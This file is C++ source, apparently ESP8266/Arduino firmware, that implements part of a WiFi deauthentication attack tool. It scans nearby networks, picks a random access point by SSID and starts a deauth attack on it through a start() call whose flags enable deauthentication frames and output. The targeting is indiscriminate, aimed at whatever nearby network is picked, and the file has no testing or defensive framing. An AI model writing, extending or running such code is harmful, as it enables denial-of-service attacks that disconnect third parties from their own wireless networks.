#include "deauth.h"

void DeauthAttack::selectRandomAP() {
    int apCount = WiFi.scanNetworks();

    if (apCount > 0) {
        int randomIndex = random(apCount);
        randomAP = WiFi.SSID(randomIndex);

        Serial.print("Selected random AP: ");
        Serial.println(randomAP);
    } else {
        Serial.println("No access points found.");
    }
}

void DeauthAttack::startRandomDeauth() {
    if (randomAP.length() > 0) {
        Serial.println("Starting deauthentication attack on the selected AP...");
        // define the attack here
        if (!running) {
            // deauth, beacon, deauth all stations, probe, output, timeout
            start(true, false, false, false, true, 0);
        } else {
            Serial.println("Attack is already running.");
        }
    } else {
        Serial.println("No access point selected. Use selectRandomAP() first.");
    }
}
